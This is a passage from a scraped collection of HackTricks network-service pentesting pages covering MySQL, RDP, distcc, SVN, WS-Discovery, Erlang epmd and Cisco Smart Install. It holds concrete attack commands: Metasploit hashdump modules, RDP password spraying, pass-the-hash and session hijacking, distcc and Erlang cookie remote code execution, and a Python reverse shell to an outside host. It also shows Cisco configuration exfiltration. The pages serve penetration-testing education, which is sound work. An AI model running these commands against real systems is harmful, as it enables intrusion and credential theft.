ffer\nschema_tables_with_full_table_scans\nschema_unused_indexes\nsession\nsession_ssl_status\nstatement_analysis\nstatements_with_errors_or_warnings\nstatements_with_full_table_scans\nstatements_with_runtimes_in_95th_percentile\nstatements_with_sorting\nstatements_with_temp_tables\nsys_config\nuser_summary\nuser_summary_by_file_io\nuser_summary_by_file_io_type\nuser_summary_by_stages\nuser_summary_by_statement_latency\nuser_summary_by_statement_type\nversion\nwait_classes_global_by_avg_latency\nwait_classes_global_by_latency\nwaits_by_host_by_latency\nwaits_by_user_by_latency\nwaits_global_by_latency\nx$host_summary\nx$host_summary_by_file_io\nx$host_summary_by_file_io_type\nx$host_summary_by_stages\nx$host_summary_by_statement_latency\nx$host_summary_by_statement_type\nx$innodb_buffer_stats_by_schema\nx$innodb_buffer_stats_by_table\nx$innodb_lock_waits\nx$io_by_thread_by_latency\nx$io_global_by_file_by_bytes\nx$io_global_by_file_by_latency\nx$io_global_by_wait_by_bytes\nx$io_global_by_wait_by_latency\nx$latest_file_io\nx$memory_by_host_by_current_bytes\nx$memory_by_thread_by_current_bytes\nx$memory_by_user_by_current_bytes\nx$memory_global_by_current_bytes\nx$memory_global_total\nx$processlist\nx$ps_digest_95th_percentile_by_avg_us\nx$ps_digest_avg_latency_distribution\nx$ps_schema_table_statistics_io\nx$schema_flattened_keys\nx$schema_index_statistics\nx$schema_table_lock_waits\nx$schema_table_statistics\nx$schema_table_statistics_with_buffer\nx$schema_tables_with_full_table_scans\nx$session\nx$statement_analysis\nx$statements_with_errors_or_warnings\nx$statements_with_full_table_scans\nx$statements_with_runtimes_in_95th_percentile\nx$statements_with_sorting\nx$statements_with_temp_tables\nx$user_summary\nx$user_summary_by_file_io\nx$user_summary_by_file_io_type\nx$user_summary_by_stages\nx$user_summary_by_statement_latency\nx$user_summary_by_statement_type\nx$wait_classes_global_by_avg_latency\nx$wait_classes_global_by_latency\nx$waits_by_host_by_latency\nx$waits_by_user_by_latency\nx$waits_global_by_latency\nHackTricks Automatic Commands\nProtocol_Name: MySql    #Protocol Abbreviation if there is one.\nPort_Number:  3306     #Comma separated if there is more than one.\nProtocol_Description: MySql     #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for MySql\nNote: |\nMySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-mysql\n‚Äã\nEntry_2:\nName: Nmap\nDescription: Nmap with MySql Scripts\nCommand: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306\n‚Äã\nEntry_3:\nName: MySql\nDescription: Attempt to connect to mysql server\nCommand: mysql -h {IP} -u {Username}@localhost\nEntry_4:\nName: MySql consolesless mfs enumeration\nDescription: MySql enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'\n‚Äã\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3299 - Pentesting SAPRouter\nNext\n- Network Services Pentesting\n3389 - Pentesting RDP\nLast modified\n5mo ago"
    },
    {
        "title": "3389 - Pentesting RDP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp",
        "text": "3389 - Pentesting RDP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nBasic Information\nRemote Desktop\nProtocol (\nRDP\n) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs\nRDP\nclient software for this purpose, while the other computer must run\nRDP\nserver software (from\nhere\n).\nDefault port:\n3389\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\nEnumeration\nAutomatic\nnmap\n--script\n\"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\"\n-p\n3389\n-T4\n<\nIP\n>\nIt checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).\n‚Äã\nBrute force\n‚Äã\nBe careful, you could lock accounts\nPassword Spraying\nBe careful, you could lock accounts\n# https://github.com/galkan/crowbar\ncrowbar\n-b\nrdp\n-s\n192.168\n.220.142/32\n-U\nusers.txt\n-c\n'password123'\n# hydra\nhydra\n-L\nusernames.txt\n-p\n'password123'\n192.168\n.2.143 rdp\nConnect with known credentials/hash\nrdesktop\n-u\n<\nusername\n>\n<\nIP\n>\nrdesktop\n-d\n<\ndomain\n>\n-u\n<\nusername\n>\n-p\n<\npassword\n>\n<\nIP\n>\nxfreerdp\n[\n/d:domain\n]\n/u:\n<\nusername\n>\n/p:\n<\npassword\n>\n/v:\n<\nIP\n>\nxfreerdp\n[\n/d:domain\n]\n/u:\n<\nusername\n>\n/pth:\n<\nhash\n>\n/v:\n<\nIP\n>\n#Pass the hash\nCheck known credentials against RDP services\nrdp_check.py from impacket let you check if some credentials are valid for a RDP service:\nrdp_check\n<\ndomain\n>\n/\n<\nname\n>\n:\n<\npassword\n>\n@\n<\nIP\n>\n‚Äã\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nAttacks\nSession stealing\nWith\nSYSTEM permissions\nyou can access any\nopened RDP session by any user\nwithout need to know the password of the owner.\nGet openned sessions:\nquery user\nAccess to the selected session\ntscon\n<\nID\n>\n/dest:\n<\nSESSIONNAME\n>\nNow you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.\nImportant\n: When you access an active RDP sessions you will kickoff the user that was using it.\nYou could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user (passwords in notepad without been saved in disk, other RDP sessions opened in other machines...)\nMimikatz\nYou could also use mimikatz to do this:\nts::sessions\n#Get sessions\nts::remote /id:2\n#Connect to the session\nSticky-keys & Utilman\nCombining this technique with\nstickykeys\nor\nutilman you will be able to access a administrative CMD and any RDP session anytime\nYou can search RDPs that have been backdoored with one of these techniques already with:\nhttps://github.com/linuz/Sticky-Keys-Slayer\n‚Äã\nRDP Process Injection\nIf someone from a different domain or with\nbetter privileges login via RDP\nto the PC where\nyou are an Admin\n, you can\ninject\nyour beacon in his\nRDP session process\nand act as him:\nRDP Sessions Abuse\nAdding User to RDP group\nnet localgroup\n\"Remote Desktop Users\"\nUserLoginName /add\nShadow Attack\nAutoRDPwn\nis a post-exploitation framework created in Powershell, designed primarily to automate the\nShadow\nattack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to\nview his victim's desktop without his consent\n, and even control it on demand, using tools native to the operating system itself.\nJoelGMSec/AutoRDPwn\nGitHub\nHackTricks Automatic Commands\nProtocol_Name: RDP    #Protocol Abbreviation if there is one.\nPort_Number:  3389     #Comma separated if there is more than one.\nProtocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for RDP\nNote: |\nRemote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-rdp\n‚Äã\nEntry_2:\nName: Nmap\nDescription: Nmap with RDP Scripts\nCommand: nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 {IP}\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3306 - Pentesting Mysql\nNext\n- Network Services Pentesting\n3632 - Pentesting distcc\nLast modified\n6mo ago"
    },
    {
        "title": "3632 - Pentesting distcc",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc",
        "text": "3632 - Pentesting distcc\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nDistcc is designed to speed up compilation by taking advantage of unused processing power on other computers. A machine with distcc installed can send code to be compiled across the network to a computer which has the distccd daemon and a compatible compiler installed\nDefault port:\n3632\nPORT     STATE SERVICE\n3632/tcp open  distccd\nExploitation\nCheck if it's vulnerable to\nCVE-2004-2687\nto execute arbitrary code:\nmsf5\n>\nuse exploit/unix/misc/distcc_exec\nnmap\n-p\n3632\n<\nip\n>\n--script\ndistcc-exec --script-args\n=\n\"distcc-exec.cmd='id'\"\nShodan\nI don't think shodan detects this service.\nResources\n‚Äã\nhttps://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec\n‚Äã\n‚Äã\nhttps://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855\n‚Äã\nPost created by\n√Ålex B (@r1p)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3389 - Pentesting RDP\nNext\n- Network Services Pentesting\n3690 - Pentesting Subversion (svn server)\nLast modified\n6mo ago"
    },
    {
        "title": "3690 - Pentesting Subversion (svn server)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server",
        "text": "3690 - Pentesting Subversion (svn server)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nSubversion is one of many version control options available today. It's often abbreviated as SVN.\nSubversion is used for maintaining current and historical versions of projects. Subversion is an open source centralized version control system. It's licensed under Apache. It's also referred to as a software version and revisioning control system.\nDefault port:\n3690\nPORT     STATE SERVICE\n3690/tcp open  svnserve Subversion\nBanner Grabbing\nnc -vn 10.10.10.10 3690\nEnumeration\nsvn\nls\nsvn://10.10.10.203\n#list\nsvn log svn://10.10.10.203\n#Commit history\nsvn checkout svn://10.10.10.203\n#Download the repository\nsvn up\n-r\n2\n#Go to revision 2 inside the checkout folder\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3632 - Pentesting distcc\nNext\n- Network Services Pentesting\n3702/UDP - Pentesting WS-Discovery\nLast modified\n6mo ago"
    },
    {
        "title": "3702/UDP - Pentesting WS-Discovery",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/3702-udp-pentesting-ws-discovery",
        "text": "3702/UDP - Pentesting WS-Discovery\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThe Web Services Dynamic Discovery Protocol (WS-Discovery) is a multicast discovery protocol that locates services on a local network.\nIn WS-Discovery terminology, a Target Service is an endpoint that makes itself available for discovery, whereas a Client is an endpoint that searches for Target Services. Both use SOAP queries over UDP to the 239.255.255.250 multicast address with the destination UDP port 3702.\nA Target Service sends a multicast Hello 1 when it joins a network. The Target Service can receive a multicast Probe 2, a message sent by a Client searching for a Target Service by Type, at any time. The Type is an identifier for the endpoint. For example, an IP camera could have NetworkVideoTransmitter as a Type. It might also send a unicast Probe Match3 if the Target Service matches a Probe (other matching Target Services might also send unicast Probe Matches). Similarly, a Target Service might receive a multicast Resolve4 at any time, a message sent by a\nClient searching for a Target by name, and send a unicast Resolve Match5 if it‚Äôs the target of a Resolve. Finally, when a Target Service leaves a network, it makes an effort to send a multicast Bye 6.\nDefault port\n: 3702\nPORT     STATE         SERVICE\n3702/udp open|filtered unknown\n| wsdd-discover:\n|   Devices\n|     Message id: 39a2b7f2-fdbd-690c-c7c9-deadbeefceb3\n|     Address: http://10.0.200.116:50000\n|_    Type: Device wprt:PrintDeviceType\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3690 - Pentesting Subversion (svn server)\nNext\n- Network Services Pentesting\n4369 - Pentesting Erlang Port Mapper Daemon (epmd)\nLast modified\n6mo ago"
    },
    {
        "title": "4369 - Pentesting Erlang Port Mapper Daemon (epmd)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd",
        "text": "4369 - Pentesting Erlang Port Mapper Daemon (epmd)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Info\nThe erlang port mapper daemon is used to coordinate distributed erlang instances. His job is to\nkeep track of which node name listens on which address\n. Hence, epmd map symbolic node names to machine addresses.\nDefault port\n: 4369\nPORT     STATE SERVICE VERSION\n4369/tcp open  epmd    Erlang Port Mapper Daemon\nThis is used by default on RabbitMQ and CouchDB installations.\nEnumeration\nManual\necho\n-n\n-e\n\"\n\\x00\\x01\\x6e\n\"\n|\nnc\n-vn\n<\nIP\n>\n4369\n‚Äã\n#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html\ndpkg\n-i\nesl-erlang_23.0-1~ubuntu~xenial_amd64.deb\napt-get\ninstall\nerlang\nerl\n#Once Erlang is installed this will promp an erlang terminal\n1\n>\nnet_adm:names\n(\n'<HOST>'\n)\n.\n#This will return the listen addresses\nAutomatic\nnmap\n-sV\n-Pn\n-n\n-T4\n-p\n4369\n--script\nepmd-info\n<\nIP\n>\n‚Äã\nPORT     STATE SERVICE VERSION\n4369\n/tcp\nopen\nepmd    Erlang Port Mapper Daemon\n|\nepmd-info:\n|\nepmd_port:\n4369\n|\nnodes:\n|\nbigcouch:\n11502\n|\nfreeswitch:\n8031\n|\necallmgr:\n11501\n|\nkazoo_apps:\n11500\n|\n_    kazoo-rabbitmq:\n25672\nErlang Cookie RCE\nRemote Connection\nIf you can\nleak the Authentication cookie\nyou will be able to execute code on the host. Usually, this cookie is located in\n~/.erlang.cookie\nand is generated by erlang at the first start. If not modified or set manually it is a random string [A:Z] with a length of 20 characters.\ngreif@baldr ~$ erl\n-cookie\nYOURLEAKEDCOOKIE\n-name\ntest2\n-remsh\n[email¬†protected]\nErlang/OTP\n19\n[\nerts-8.1\n]\n[\nsource\n]\n[\n64\n-bit\n]\n[\nasync-threads:10\n]\n‚Äã\nEshell V8.1\n(\nabort with ^G\n)\n‚Äã\nAt last, we can start an erlang shell on the remote system.\n‚Äã\n(\n[email¬†protected]\n)\n1\n>\nos:cmd\n(\n\"id\"\n)\n.\n\"uid=0(root) gid=0(root) groups=0(root)\n\\n\n\"\nMore information in\nhttps://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/\nThe author also share a program to brutforce the cookie:\nepmd_bf-0.1.tar.bz2\n7KB\nBinary\nLocal Connection\nIn this case we are going to abuse CouchDB to escalate privileges locally:\nHOME\n=\n/ erl\n-sname\nanonymous\n-setcookie\nYOURLEAKEDCOOKIE\n(\nanonymous@canape\n)\n1\n>\nrpc:call\n(\n'couchdb@localhost'\n, os, cmd,\n[\nwhoami\n])\n.\n\"homer\n\\n\n\"\n(\nanonymous@canape\n)\n4\n>\nrpc:call\n(\n'couchdb@localhost'\n, os, cmd,\n[\n\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect\n((\n\\\"\n10.10.14.9\n\\\"\n,\n9005\n))\n;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\n\\\"\n/bin/sh\n\\\"\n,\n\\\"\n-i\n\\\"\n]);'\"\n])\n.\nExample taken from\nhttps://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution\nYou can use\nCanape HTB machine to\npractice\nhow to\nexploit this vuln\n.\nMetasploit\n#Metasploit can also exploit this if you know the cookie\nmsf\n5\n>\nuse exploit/multi/misc/erlang_cookie_rce\nShodan\nport:4369 \"at port\"\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3702/UDP - Pentesting WS-Discovery\nNext\n- Network Services Pentesting\n4786 - Cisco Smart Install\nLast modified\n6mo ago"
    },
    {
        "title": "4786 - Cisco Smart Install",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/4786-cisco-smart-install",
        "text": "4786 - Cisco Smart Install\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nCisco Smart Install\nis a Cisco designed to automate the initial configuration and loading of an operating system image for new Cisco hardware.\nBy default, Cisco Smart Install is active on Cisco hardware and uses the transport layer protocol, TCP, with port number 4786.\nDefault port:\n4786\nPORT      STATE  SERVICE\n4786/tcp  open   smart-install\nSmart Install Exploitation Tool\nIn 2018, a critical vulnerability, CVE-2018‚Äì0171, was found in this protocol. The threat level is 9.8 on the CVSS scale.\nA specially crafted packet sent to the TCP/4786 port, where Cisco Smart Install is active, triggers a buffer overflow, allowing an attacker to:\nforcibly reboot the device\ncall RCE\nsteal configurations of network equipment.\nThe\nSIET\n(Smart Install Exploitation Tool)\nwas developed to exploit this vulnerability, it allows you to abuse Cisco Smart Install. In this article I will show you how you can read a legitimate network hardware configuration file. Configure exfiltration can be valuable for a pentester because it will learn about the unique features of the network. And this will make life easier and allow finding new vectors for an attack.\nThe target device will be a ‚Äúlive‚Äù Cisco Catalyst 2960 switch. Virtual images do not have Cisco Smart Install, so you can only practice on the real hardware.\nThe address of the target switch is\n10.10.100.10 and CSI is active.\nLoad SIET and start the attack.\nThe -g argument\nmeans exfiltration of the configuration from the device,\nthe -i argument\nallows you to set the IP address of the vulnerable target.\n~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.10.100.10\nThe switch configuration\n10.10.100.10\nwill be in the\ntftp/\nfolder\n\\\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n4369 - Pentesting Erlang Port Mapper Daemon (epmd)\nNext\n- Network Services Pentesting\n5000 - Pentesting Docker Registry\nLast modified\n6mo ago"
    },
    {
        "title": "5000 - Pentesting Docker Registry",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry",
